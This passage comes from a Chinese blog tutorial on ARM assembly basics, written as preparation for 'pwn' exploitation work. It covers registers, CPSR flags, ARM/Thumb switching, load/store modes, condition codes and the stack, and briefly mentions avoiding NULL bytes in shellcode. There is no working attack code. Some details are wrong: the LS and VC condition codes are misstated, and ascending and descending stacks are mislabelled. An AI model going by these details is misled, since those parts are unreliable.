-<td style="text-align:left">一般用途</td>
-</tr>
-<tr>
-<td>R4型</td>
-<td>–</td>
-<td style="text-align:left">一般用途</td>
-</tr>
-<tr>
-<td>R5</td>
-<td>–</td>
-<td style="text-align:left">一般用途</td>
-</tr>
-<tr>
-<td>R6型</td>
-<td>–</td>
-<td style="text-align:left">一般用途</td>
-</tr>
-<tr>
-<td>R7型</td>
-<td>–</td>
-<td style="text-align:left">持有系统调用号</td>
-</tr>
-<tr>
-<td>R8型</td>
-<td>–</td>
-<td style="text-align:left">一般用途</td>
-</tr>
-<tr>
-<td>R9型</td>
-<td>–</td>
-<td style="text-align:left">一般用途</td>
-</tr>
-<tr>
-<td>R10型</td>
-<td>–</td>
-<td style="text-align:left">一般用途</td>
-</tr>
-<tr>
-<td>R11型</td>
-<td>FP</td>
-<td style="text-align:left">帧指针</td>
-</tr>
-<tr>
-<td>R12</td>
-<td>IP</td>
-<td style="text-align:left">程序内呼叫</td>
-</tr>
-<tr>
-<td>R13</td>
-<td>SP</td>
-<td style="text-align:left">栈指针</td>
-</tr>
-<tr>
-<td>R14</td>
-<td>LR</td>
-<td style="text-align:left">链接注册</td>
-</tr>
-<tr>
-<td>R15</td>
-<td>PC</td>
-<td style="text-align:left">程序计数器</td>
-</tr>
-<tr>
-<td>CPSR</td>
-<td>–</td>
-<td style="text-align:left">当前程序状态寄存器</td>
-</tr>
-</tbody>
-</table>
-</div>
-<ul>
-<li><strong>R0-R12：</strong>可在常见操作期间用于存储临时值、指针（到内存的位置）等<ul>
-<li>R0 在算术运算期间可以称为累加器，或者用于存储以前调用的函数的结果</li>
-<li>R7 在使用系统调用时变得很有用，因为它存储了 syscall 编号</li>
-<li>R11 帮助我们跟踪栈上的边界，作为帧指针（稍后将介绍）</li>
-<li>R0-R3：ARM 上的函数调用约定指定函数的前四个参数存储在寄存器 r0-r3 中</li>
-</ul>
-</li>
-<li><strong>R13：SP</strong>（栈指针）栈指针指向栈的顶部<ul>
-<li>栈是用于特定于函数的存储的内存区域，当函数返回时，将回收该内存区域</li>
-<li>因此，栈指针用于分配栈上的空间，方法是从栈指针中减去我们要分配的值（以字节为单位），换句话说，如果我们想分配一个32位值，我们从栈指针中减去“4”</li>
-</ul>
-</li>
-<li><strong>R14：LR</strong>（链路寄存器）进行函数调用时，链接寄存器将使用内存地址进行更新，该内存地址引用从中启动函数的下一条指令<ul>
-<li>这样做允许程序返回到在“子”函数完成后启动“子”函数调用的“父”函数</li>
-</ul>
-</li>
-<li><strong>R15：PC</strong>（程序计数器）程序计数器按执行的指令的大小自动递增<ul>
-<li>此大小在 <code>ARM</code> 状态下始终为4个字节，在 <code>THUMB</code> 模式下始终为2个字节</li>
-<li>当执行分支指令时，PC保存目标地址，在执行过程中，PC 将当前指令加 8（两条 ARM 指令）的地址存储在 <code>ARM</code> 状态，将当前指令加 4（两条拇指指令）的地址存储在 <code>Thumb(v1)</code> 状态</li>
-<li>PS：这与x86不同，在x86中，PC 始终指向要执行的下一条指令</li>
-</ul>
-</li>
-</ul>
-<p><strong>CPSR：</strong>显示当前程序状态寄存器（CPSR）的值</p>
-<ul>
-<li>在此值下，您可以看到标志 &gt;&gt; <code>thumb, fast, interrupt, overflow, carry, zero, and negative</code></li>
-<li>这些标志表示 CPSR 寄存器中的某些位，并根据 CPSR 的值进行设置，并在激活时变为 <strong>粗体</strong></li>
-<li>N、Z、C 和 V 位与 x86 上 EFLAG 寄存器中的 SF、ZF、CF 和 OF 位相同，它们将用于支持程序集级别的条件和循环中的条件执行：<ul>
-<li><strong>N</strong> – 当操作结果为负时设置</li>
-<li><strong>Z</strong> – 当操作结果为零时设置</li>
-<li><strong>C</strong> – 判断无符号数是否溢出</li>
-<li><strong>V</strong> – 判断带符号数是否溢出</li>
-</ul>
-</li>
-</ul>
-<p><img src="/2022/08/29/ARM%20pwn%20%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA+%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/1661586815885.png" alt="1661586815885"> </p>
-<p>下表展示了 CPSR 中各个位的具体作用：</p>
-<div class="table-container">
-<table>
-<thead>
-<tr>
-<th style="text-align:left">Flag</th>
-<th style="text-align:left">Description</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:left">N<br>(Negative)</td>
-<td style="text-align:left">如果指令结果产生负数，则启用</td>
-</tr>
-<tr>
-<td style="text-align:left">Z<br>(Zero)</td>
-<td style="text-align:left">如果指令的结果产生零值，则启用</td>
-</tr>
-<tr>
-<td style="text-align:left">C<br>(Carry)</td>
-<td style="text-align:left">如果指令的结果产生一个需要完全表示第 33 位的值，则启用该值</td>
-</tr>
-<tr>
-<td style="text-align:left">V<br>(Overflow)</td>
-<td style="text-align:left">如果指令的结果产生的值不能用 32 位 2 的补码表示，则启用此选项</td>
-</tr>
-<tr>
-<td style="text-align:left">E<br>(Endian-bit)</td>
-<td style="text-align:left">ARM可以在小端序或大端中进行切换，对于小字节序，此位设置为“0”，对于大字节序模式，此位设置为“1”</td>
-</tr>
-<tr>
-<td style="text-align:left">T<br>(Thumb-bit)</td>
-<td style="text-align:left">如果您处于 Thumb 状态，则设置此位，并在您处于 ARM 状态时被禁用</td>
-</tr>
-<tr>
-<td style="text-align:left">M<br>(Mode-bits)</td>
-<td style="text-align:left">这些位指定当前权限模式（USR、SVC 等）</td>
-</tr>
-<tr>
-<td style="text-align:left">J<br>(Jazelle)</td>
-<td style="text-align:left">第三个执行状态，允许某些 ARM 处理器在硬件中执行 Java 字节码</td>
-</tr>
-</tbody>
-</table>
-</div>
-<h2 id="ARM-amp-THUMB"><a href="#ARM-amp-THUMB" class="headerlink" title="ARM &amp; THUMB"></a>ARM &amp; THUMB</h2><p>ARM 处理器有两种主要状态，它们可以在其中运行（这里不算Jazelle）：ARM 和 Thumb</p>
-<ul>
-<li>Thumb 是 ARM 体系结构中一种 <strong>16位的指令集</strong></li>
-<li>Thumb 指令集可以看作是 ARM 指令压缩形式的子集，它是为减小代码量而提出，具有16bit的代码密度</li>
-</ul>
-<p>这些状态与权限级别无关，例如，在 SVC 模式下运行的代码可以是 ARM 或 Thumb，这两种状态之间的主要区别在于指令集，其中 ARM 状态下的指令始终为32位，而 Thumb 状态的指令为16位（但可以是32位）</p>
-<p>了解何时以及如何使用 Thumb 对于我们的 ARM 漏洞利用开发目的尤为重要，在编写 ARM 外壳代码时，我们需要删除 NULL 字节，并使用 16 位 Thumb 指令而不是 32 位 ARM 指令来降低拥有它们的机会</p>
-<p>如前所述，有不同的 Thumb 版本，不同的命名只是为了将它们彼此区分开来：（处理器本身将始终将其称为 Thumb）</p>
-<ul>
-<li>Thumb-1（16 位指令）：用于 ARMv6 和早期架构</li>
-<li>Thumb-2（16 位和 32 位指令）：通过添加更多指令并允许它们为 16 位或 32 位宽（ARMv6T2、ARMv7）来扩展 Thumb-1</li>
-<li>ThumbEE：包括一些针对动态生成的代码（在执行前或执行期间在设备上编译的代码）的一些更改和添加</li>
-</ul>
-<p>ARM 和 Thumb 之间的区别：</p>
-<ul>
-<li>条件执行：<ul>
-<li>ARM 状态下的所有指令都支持条件执行，某些 ARM 处理器版本允许使用 IT 指令在 Thumb 中执行条件（条件执行导致更高的代码密度，因为它减少了要执行的指令数量，并减少了昂贵的分支指令的数量）</li>
-</ul>
-</li>
-<li>32 位 ARM 和 Thumb 指令：<ul>
-<li>32 位 Thumb 指令具有 .w 后缀</li>
-<li>32 位 ARM 指令没有</li>
-</ul>
-</li>
-<li>桶形移位器：<ul>
-<li>是另一个独特的 ARM 模式功能，它可用于将多个指令缩小为一个</li>
-</ul>
-</li>
-</ul>
-<p>要切换处理器执行的状态，必须满足以下两个条件之一：</p>
-<ul>
-<li>我们可以使用分支指令BX（分支和交换）或BLX（分支，链路和交换），并将目标寄存器的最低有效位设置为1<ul>
-<li>这可以通过将1添加到偏移量（如0x5530 + 1）来实现</li>
-<li>您可能会认为这会导致对齐问题，因为指令是 2 字节或 4 字节对齐的</li>
-<li>不够都这不是问题，因为处理器将忽略最低有效位</li>
-</ul>
-</li>
-<li>我们知道，如果当前程序状态寄存器中的 T 位已设置，则处于 Thumb 模式</li>
-</ul>
-<h2 id="ARM-指令集"><a href="#ARM-指令集" class="headerlink" title="ARM 指令集"></a>ARM 指令集</h2><p>汇编语言由指令组成，这些指令是主要的构建块，ARM 指令后面通常跟一个或两个操作数，通常使用以下模板： </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MNEMONIC&#123;S&#125;&#123;condition&#125; &#123;Rd&#125;, Operand1, Operand2</span><br></pre></td></tr></table></figure>
-<p>由于 ARM 指令集的灵活性，并非所有指令都使用模板中提供的所有字段</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">MNEMONIC - 指令的简称(助记符)</span><br><span class="line">&#123;S&#125; - 可选后缀,如果指定了S,则条件标志会根据操作结果更新</span><br><span class="line">&#123;condition&#125; - 执行指令需要满足的条件</span><br><span class="line">&#123;Rd&#125; - 用于存储指令结果的寄存器(目标)</span><br><span class="line">Operand1 - 第一个操作数,寄存器或立即数</span><br><span class="line">Operand2 - 第二个(灵活的)操作数,可以是立即数(数字)或带有可选移位的寄存器</span><br></pre></td></tr></table></figure>
-<p>虽然 MNEMONIC、S、Rd 和 Operand1 字段是直截了当的，但条件和 Operand2 字段需要进一步澄清：</p>
-<ul>
-<li>条件字段与 CPSR 寄存器的值紧密相关，或者更确切地说，与寄存器中特定位的值紧密相关</li>
-<li>Operand2 被称为灵活的操作数，因为我们可以以各种形式使用它：<ul>
-<li>作为即时值（具有有限的值集）</li>
-<li>寄存器</li>
-<li>以移位寄存器</li>
-</ul>
-</li>
-<li>例如，我们可以将这些表达式用作操作数 2：  </li>
-</ul>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#123 - 立即值(具有有限的一组值)</span></span><br><span class="line"><span class="attribute">Rx</span> - 寄存器 x(如 R<span class="number">1</span>、R<span class="number">2</span>、R<span class="number">3</span> ...)</span><br><span class="line"><span class="attribute">Rx</span>, ASR n - 寄存器 x 算术右移 n 位 (<span class="number">1</span> = n = <span class="number">32</span>)</span><br><span class="line"><span class="attribute">Rx</span>, LSL n - 寄存器 x 逻辑左移 n 位 (<span class="number">0</span> = n = <span class="number">31</span>)</span><br><span class="line"><span class="attribute">Rx</span>, LSR n - 寄存器 x 逻辑右移 n 位 (<span class="number">1</span> = n = <span class="number">32</span>)</span><br><span class="line"><span class="attribute">Rx</span>, ROR n - 寄存器 x 右移 n 位 (<span class="number">1</span> = n = <span class="number">31</span>)</span><br><span class="line"><span class="attribute">Rx</span>, RRX - 寄存器 x 右移一位,扩展</span><br></pre></td></tr></table></figure>
-<ul>
-<li>作为不同类型说明的快速示例，让我们看一下以下列表：</li>
-</ul>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ADD</span> R<span class="number">0</span>, R<span class="number">1</span>, R<span class="number">2</span> - 将 R<span class="number">1</span> (Operand<span class="number">1</span>) 和 R<span class="number">2</span> (Operand<span class="number">2</span> 的寄存器形式) 的内容相加并将结果存储到 R<span class="number">0</span> (Rd)</span><br><span class="line"><span class="attribute">ADD</span> R<span class="number">0</span>, R<span class="number">1</span>, #<span class="number">2</span> - 将 R<span class="number">1</span> (Operand<span class="number">1</span>) 的内容与值 <span class="number">2</span> (Operand<span class="number">2</span> 的立即数形式) 相加并将结果存储到 R<span class="number">0</span> (Rd)</span><br><span class="line"><span class="attribute">MOVLE</span> R<span class="number">0</span>, #<span class="number">5</span> - 仅当满足条件 LE (小于或等于)时,将数字 <span class="number">5</span> (操作数 <span class="number">2</span>,因为编译器将其视为 MOVLE R<span class="number">0</span>, R<span class="number">0</span>, #<span class="number">5</span>) 移动到 R<span class="number">0</span>(Rd)</span><br><span class="line"><span class="attribute">MOV</span> R<span class="number">0</span>, R<span class="number">1</span>, LSL #<span class="number">1</span> - 将 R<span class="number">1</span> 的内容(操作数 <span class="number">2</span> 采用逻辑左移的寄存器形式)左移一位到 R<span class="number">0</span>(Rd),因此,如果 R<span class="number">1</span> 的值为 <span class="number">2</span>,它会左移一位并变为 <span class="number">4</span>,然后将 <span class="number">4</span> 移至 R<span class="number">0</span></span><br></pre></td></tr></table></figure>
-<p>作为快速摘要，让我们看一下我们将在以后的示例中使用的最常见的说明</p>
-<div class="table-container">
-<table>
-<thead>
-<tr>
-<th style="text-align:center">指令</th>
-<th style="text-align:left">描述</th>
-<th style="text-align:center">指令</th>
-<th style="text-align:left">描述</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:center">MOV</td>
-<td style="text-align:left">Move data</td>
-<td style="text-align:center">EOR</td>
-<td style="text-align:left">Bitwise XOR</td>
-</tr>
-<tr>
-<td style="text-align:center">MVN</td>
-<td style="text-align:left">Move and negate</td>
-<td style="text-align:center">LDR</td>
-<td style="text-align:left">Load</td>
-</tr>
-<tr>
-<td style="text-align:center">ADD</td>
-<td style="text-align:left">Addition</td>
-<td style="text-align:center">STR</td>
-<td style="text-align:left">Store</td>
-</tr>
-<tr>
-<td style="text-align:center">SUB</td>
-<td style="text-align:left">Subtraction</td>
-<td style="text-align:center">LDM</td>
-<td style="text-align:left">Load Multiple</td>
-</tr>
-<tr>
-<td style="text-align:center">MUL</td>
-<td style="text-align:left">Multiplication</td>
-<td style="text-align:center">STM</td>
-<td style="text-align:left">Store Multiple</td>
-</tr>
-<tr>
-<td style="text-align:center">LSL</td>
-<td style="text-align:left">Logical Shift Left</td>
-<td style="text-align:center">PUSH</td>
-<td style="text-align:left">Push on Stack</td>
-</tr>
-<tr>
-<td style="text-align:center">LSR</td>
-<td style="text-align:left">Logical Shift Right</td>
-<td style="text-align:center">POP</td>
-<td style="text-align:left">Pop off Stack</td>
-</tr>
-<tr>
-<td style="text-align:center">ASR</td>
-<td style="text-align:left">Arithmetic Shift Right</td>
-<td style="text-align:center">B</td>
-<td style="text-align:left">Branch</td>
-</tr>
-<tr>
-<td style="text-align:center">ROR</td>
-<td style="text-align:left">Rotate Right</td>
-<td style="text-align:center">BL</td>
-<td style="text-align:left">Branch with Link</td>
-</tr>
-<tr>
-<td style="text-align:center">CMP</td>
-<td style="text-align:left">Compare</td>
-<td style="text-align:center">BX</td>
-<td style="text-align:left">Branch and eXchange</td>
-</tr>
-<tr>
-<td style="text-align:center">AND</td>
-<td style="text-align:left">Bitwise AND</td>
-<td style="text-align:center">BLX</td>
-<td style="text-align:left">Branch with Link and eXchange</td>
-</tr>
-<tr>
-<td style="text-align:center">ORR</td>
-<td style="text-align:left">Bitwise OR</td>
-<td style="text-align:center">SWI/SVC</td>
-<td style="text-align:left">System Call</td>
-</tr>
-</tbody>
-</table>
-</div>
-<h2 id="加载和存储"><a href="#加载和存储" class="headerlink" title="加载和存储"></a>加载和存储</h2><p>ARM 使用 load-store 模型进行内存访问，这意味着只有 load/store（LDR 和 STR）指令才能访问内存，虽然在x86上允许大多数指令直接对内存中的数据进行操作，但在ARM上，<strong>数据必须在操作之前从内存移动到寄存器中</strong></p>
-<p>这意味着在 ARM 上的特定内存地址递增 32 位值需要三种类型的指令（加载、递增和存储），首先将特定地址的值加载到寄存器中，在寄存器中递增，然后将其从寄存器存储回存储器</p>
-<p>通常，<code>LDR</code> 用于将某些内容从内存加载到寄存器中，而 <code>STR</code> 用于将某些内容从寄存器存储到内存地址</p>
-<p><strong>常规操作</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LDR R2, [R0] 	@ [R0]:原始地址是在 R0 中找到的值</span><br><span class="line">STR R2, [R1] 	@ [R1]:目标地址是在 R1 中找到的值</span><br></pre></td></tr></table></figure>
-<ul>
-<li>LDR 操作：将 R0 中找到的地址处的值加载到目标寄存器 R2</li>
-<li>STR 操作：将 R2 中找到的值存储到 R1 中找到的内存地址</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">STR    Ra, [Rb, imm]</span><br><span class="line">LDR    Ra, [Rc, imm]</span><br></pre></td></tr></table></figure>
-<ul>
-<li>偏移形式为：使用立即（整数）作为偏移量</li>
-<li><strong>偏移地址模式</strong>：先从基本寄存器 Ra 中添加或减去此值，然后再使用已知的偏移量访问数据</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">STR    Ra, [Rb, Rc]</span><br><span class="line">LDR    Ra, [Rb, Rc]</span><br></pre></td></tr></table></figure>
-<ul>
-<li>偏移形式为：使用寄存器作为偏移（偏移地址模式）<ul>
-<li>Rb 是基寄存器</li>
-<li>Rc 是偏移</li>
-</ul>
-</li>
-<li>使用场景：当您的代码想要访问在运行时计算索引的数组</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LDR    Ra, [Rb, Rc, &lt;shifter&gt;]</span><br><span class="line">STR    Ra, [Rb, Rc, &lt;shifter&gt;]</span><br></pre></td></tr></table></figure>
-<ul>
-<li>偏移形式为：具有缩放寄存器作为偏移（偏移地址模式）<ul>
-<li>Rb 是基寄存器</li>
-<li>Rc 是左/右移位（&lt; shifter &gt;）的即时偏移（或包含即时值的寄存器），以缩放即时偏移（这意味着桶形移位器用于缩放偏移）</li>
-</ul>
-</li>
-<li>使用场景：循环以循环访问数组</li>
-</ul>
-<p><strong>特殊操作</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LDR r3, [r1], #offset</span><br></pre></td></tr></table></figure>
-<ul>
-<li><strong>索引后地址模式</strong>：这意味着基寄存器（R1）用作最终地址，然后使用 R1 + 4 计算的失调进行更新</li>
-<li>换句话说，它采用在 R1（不是 R1+4）中找到的值并将其加载到 R3 中，然后将 R1 更新为 R1 + offset</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ADR r0, words+12             /* address of words[3] -&gt; r0 */</span><br></pre></td></tr></table></figure>
-<ul>
-<li>我们使用 ADR 指令（懒惰方法）来获取 <code>word[3]</code> 的地址放入 R0</li>
-<li>PS：其实这两个都是伪指令<ul>
-<li>ADR 是小范围的地址读取伪指令</li>
-<li>LDR 是大范围的读取地址伪指令</li>
-</ul>
-</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LDR r1, array_buff_bridge    /* address of array_buff[0] -&gt; r1 */</span><br><span class="line">LDR r2, array_buff_bridge+4  /* address of array_buff[2] -&gt; r2 */</span><br></pre></td></tr></table></figure>
-<ul>
-<li>执行上述两条指令后，R1 和 R2 包含 <code>array_buff[0]</code> 和 <code>array_buff[2]</code> 的地址</li>
-<li>PS：对于数组，可以采用这种这种写法</li>
-</ul>
-<p><strong>同时处理多个值</strong></p>
-<p>有时，一次加载（或存储）多个值会更有效，为此，我们使用 LDM（加载多个）和 STM（存储多个）指令：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LDM r0, &#123;r4,r5&#125;              /* words[3] -&gt; r4 = 0x03; words[4] -&gt; r5 = 0x04 */</span><br></pre></td></tr></table></figure>
-<ul>
-<li>R0 中装有 <code>word[3]</code> </li>
-<li>我们使用一个命令加载了多个（2个数据块），该命令将：<ul>
-<li><code>R4 = 0x00000003</code> </li>
-<li><code>R5 = 0x00000004</code></li>
-</ul>
-</li>
-<li>PS：注意在合适的位置打上花括号</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stm r1, &#123;r4,r5&#125;              /* r4 -&gt; array_buff[0] = 0x03; r5 -&gt; array_buff[1] = 0x04 */</span><br></pre></td></tr></table></figure>
-<ul>
-<li>R1 中装有 <code>array_buff[0]</code> </li>
-<li>我们使用一个命令存储了多个（2个数据块），该命令将：<ul>
-<li><code>array_buff[0] = 0x00000003</code></li>
-<li><code>array_buff[1] = 0x00000004</code></li>
-</ul>
-</li>
-</ul>
-<h2 id="条件执行"><a href="#条件执行" class="headerlink" title="条件执行"></a>条件执行</h2><p>CPSR 中的 N、Z、C 和 V 位与 x86 上 EFLAG 寄存器中的 SF、ZF、CF 和 OF 位相同，它们将用于支持程序集级别的条件和循环中的条件执行</p>
-<p>下表列出了可用的条件代码、其含义以及测试的标志的状态：</p>
-<div class="table-container">
-<table>
-<thead>
-<tr>
-<th style="text-align:center">Condition Code</th>
-<th style="text-align:center">Meaning (for cmp or subs)</th>
-<th style="text-align:center">Status of Flags</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:center">EQ</td>
-<td style="text-align:center">相等</td>
-<td style="text-align:center">Z==1</td>
-</tr>
-<tr>
-<td style="text-align:center">NE</td>
-<td style="text-align:center">不相等</td>
-<td style="text-align:center">Z==0</td>
-</tr>
-<tr>
-<td style="text-align:center">GT</td>
-<td style="text-align:center">大于（有符号）</td>
-<td style="text-align:center">(Z==0) &amp;&amp; (N==V)</td>
-</tr>
-<tr>
-<td style="text-align:center">LT</td>
-<td style="text-align:center">小于（有符号）</td>
-<td style="text-align:center">N!=V</td>
-</tr>
-<tr>
-<td style="text-align:center">GE</td>
-<td style="text-align:center">大于等于（有符号）</td>
-<td style="text-align:center">N==V</td>
-</tr>
-<tr>
-<td style="text-align:center">LE</td>
-<td style="text-align:center">小于等于（有符号）</td>
-<td style="text-align:center">(Z==1) \</td>
-<td>\</td>
-<td>(N!=V)</td>
-</tr>
-<tr>
-<td style="text-align:center">CS or HS</td>
-<td style="text-align:center">大于等于（无符号）</td>
-<td style="text-align:center">C==1</td>
-</tr>
-<tr>
-<td style="text-align:center">CC or LO</td>
-<td style="text-align:center">小于（无符号）</td>
-<td style="text-align:center">C==0</td>
-</tr>
-<tr>
-<td style="text-align:center">HI</td>
-<td style="text-align:center">大于（无符号）</td>
-<td style="text-align:center">(C==1) &amp;&amp; (Z==0)</td>
-</tr>
-<tr>
-<td style="text-align:center">LS</td>
-<td style="text-align:center">小于等于（无符号）</td>
-<td style="text-align:center">(C==0) \</td>
-<td>\</td>
-<td>(Z==0)</td>
-</tr>
-<tr>
-<td style="text-align:center">MI</td>
-<td style="text-align:center">负数</td>
-<td style="text-align:center">N==1</td>
-</tr>
-<tr>
-<td style="text-align:center">PL</td>
-<td style="text-align:center">正数或零</td>
-<td style="text-align:center">N==0</td>
-</tr>
-<tr>
-<td style="text-align:center">AL</td>
-<td style="text-align:center">True</td>
-<td style="text-align:center">–</td>
-</tr>
-<tr>
-<td style="text-align:center">NV</td>
-<td style="text-align:center">False</td>
-<td style="text-align:center">–</td>
-</tr>
-<tr>
-<td style="text-align:center">VS</td>
-<td style="text-align:center">有符号溢出</td>
-<td style="text-align:center">V==1</td>
-</tr>
-<tr>
-<td style="text-align:center">VC</td>
-<td style="text-align:center">无符号溢出</td>
-<td style="text-align:center">V==0</td>
-</tr>
-</tbody>
-</table>
-</div>
-<p><strong>Thumb 条件执行</strong></p>
-<p>ARM 存在多种允许条件执行的 Thumb 版本，某些 ARM 处理器版本支持“IT”指令，该指令允许在 Thumb 状态下有条件地执行最多 4 条指令 </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IT&#123;x&#123;y&#123;z&#125;&#125;&#125; cond</span><br></pre></td></tr></table></figure>
-<ul>
-<li><em>cond</em> 指定 IT 块中第<strong>一</strong>条指令的条件</li>
-<li><em>x</em> 指定 IT 块中第<strong>二</strong>条指令的条件开关</li>
-<li><em>y</em> 指定 IT 块中第<strong>三</strong>条指令的条件开关</li>
-<li><em>z</em> 指定 IT 块中第<strong>四</strong>条指令的条件开关</li>
-</ul>
-<p>IT 指令的结构是 “IF-Then-(Else)”，语法是两个字母 T 和 E 的构造：</p>
-<ul>
-<li>IT 指的是 If-Then（下一个指令是有条件的）</li>
-<li>ITT 指的是 If-Then-Then（接下来的2条指令是有条件的）</li>
-<li>ITE 指的是 If-Then-Else（接下来的2条指令是有条件的）</li>
-<li>ITTE 指的是 If-Then-Then-Else（接下来的3个指令是有条件的）</li>
-<li>ITTEE 指的是 If-Then-Then-Else-Else（接下来的4个指令是有条件的）</li>
-</ul>
-<p>IT 块内的每条指令都必须指定一个相同或逻辑相反的条件后缀：</p>
-<ul>
-<li>如果使用 ITE，则第一条和第二条指令 (If-Then) 必须具有相同的条件后缀，第三条指令 (Else) 必须具有前两条指令的逻辑反比</li>
-<li>以下是 ARM 参考手册中的一些示例，其中说明了此逻辑： </li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ITTE   NE           ; Next 3 instructions are conditional</span><br><span class="line">ANDNE  R0, R0, R1   ; ANDNE does not update condition flags</span><br><span class="line">ADDSNE R2, R2, #1   ; ADDSNE updates condition flags</span><br><span class="line">MOVEQ  R2, R3       ; Conditional move</span><br><span class="line"></span><br><span class="line">ITE    GT           ; Next 2 instructions are conditional</span><br><span class="line">ADDGT  R1, R0, #55  ; Conditional addition in case the GT is true</span><br><span class="line">ADDLE  R1, R0, #48  ; Conditional addition in case the GT is not true</span><br><span class="line"></span><br><span class="line">ITTEE  EQ           ; Next 4 instructions are conditional</span><br><span class="line">MOVEQ  R0, R1       ; Conditional MOV</span><br><span class="line">ADDEQ  R2, R2, #10  ; Conditional ADD</span><br><span class="line">ANDNE  R3, R3, #1   ; Conditional AND</span><br><span class="line">BNE.W  dloop        ; Branch instruction can only be used in the last instruction of an IT block</span><br></pre></td></tr></table></figure>
-<p><strong>跳转&amp;分支</strong></p>
-<p>分支（又名Jumps）允许我们跳转到另一个代码段，当我们需要跳过（或重复）代码块或跳转到特定函数时，这很有用</p>
-<ul>
-<li>这种用例的最佳示例是 IF 和 Loop</li>
-</ul>
-<p>有三种类型的分支指令：</p>
-<ul>
-<li>分支（B）<ul>
-<li>简单跳转到函数</li>
-</ul>
-</li>
-<li>分支链接（BL）<ul>
-<li>在 LR 中保存 （PC+4） 并跳转到功能</li>
-</ul>
-</li>
-<li>分支交换（BX）和分支链路交换（BLX）<ul>
-<li>与 B/BL 交换指令集相同（ARM &lt;-&gt; Thumb）</li>
-<li>需要寄存器作为第一个操作数：BX/BLX [reg]</li>
-</ul>
-</li>
-<li>BX/BLX 用于将指令集从 ARM 交换到 Thumb，示例如下：</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.text</span><br><span class="line">.global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">     .code 32         @ ARM mode</span><br><span class="line">     add r2, pc, #1   @ put PC+1 into R2</span><br><span class="line">     bx r2            @ branch + exchange to R2</span><br><span class="line"></span><br><span class="line">    .code 16          @ Thumb mode</span><br><span class="line">     mov r0, #1</span><br></pre></td></tr></table></figure>
-<ul>
-<li>这里的诀窍是获取实际 PC 的当前值，将其增加“1”，将结果存储到寄存器，然后执行 <code>BX/BLX [reg]</code></li>
-<li><code>add r2, pc, #1</code>：简单地获取有效的PC地址（即当前PC寄存器的值+8 -&gt; 0x805C）并为其添加“1”（0x805C + 1 = 0x805D） </li>
-</ul>
-<h2 id="栈和函数"><a href="#栈和函数" class="headerlink" title="栈和函数"></a>栈和函数</h2><p><strong>栈</strong> </p>
-<p>一般来说，堆栈是程序/进程中的内存区域，这部分内存是在创建进程时分配的</p>
-<ul>
-<li>我们使用 Stack 来存储临时数据，例如某些函数的局部变量，帮助我们在函数之间转换的环境变量等</li>
-<li>我们使用 PUSH 和 POP 指令与堆栈进行交互，如 PUSH 和 POP（这是其他一些内存相关指令的别名，而不是实际指令，但出于简单起见，我们使用 PUSH 和 POP）</li>
-</ul>
-<p>首先，当我们说 Stack 增长时，我们的意思是一个项目（32位数据）被放在 Stack 上，堆栈可以 <strong>向上</strong> 增长（当堆栈以降序方式实现时）或 <strong>向下</strong> 增长（当堆栈以上升方式实现时），下一条（32位）信息的实际位置由堆栈指针定义，或者确切地说，由存储在SP寄存器中的内存地址定义</p>
-<p>栈地址的增长方向：</p>
-<ul>
-<li>向高地址增长的栈称为 <strong>递增栈</strong>（Descendent Stack）</li>
